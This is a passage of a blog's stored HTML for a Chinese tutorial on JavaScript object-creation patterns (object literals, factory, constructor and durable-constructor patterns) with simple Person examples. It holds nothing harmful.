class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"weiqi\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p>\n \n>转自：http://blog.csdn.net/u014346301/article/details/52204967","slug":"JavaScript创建对象的七种模式","published":1,"updated":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym30360031cdon6zinl5ht","content":"<p><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“liubei”</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“shayemuyou”</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“liubei”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“shayemuyou”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br> <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“alert(this.name);”</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" 